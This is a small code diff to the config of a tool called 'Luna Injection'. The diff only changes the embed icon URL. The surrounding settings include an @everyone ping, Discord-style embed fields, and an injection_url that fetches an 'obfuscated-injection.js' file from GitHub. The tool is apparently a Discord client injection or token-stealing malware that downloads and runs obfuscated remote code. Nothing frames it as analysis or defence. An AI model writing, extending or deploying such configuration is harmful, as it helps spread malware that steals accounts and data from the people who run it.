@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'),
+  embed_icon: 'https://cdn.discordapp.com/attachments/1134248299780657245/1144310810848542771/jazzrox12.gif?size=4096'.replace(/ /g, '%20'),
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
 
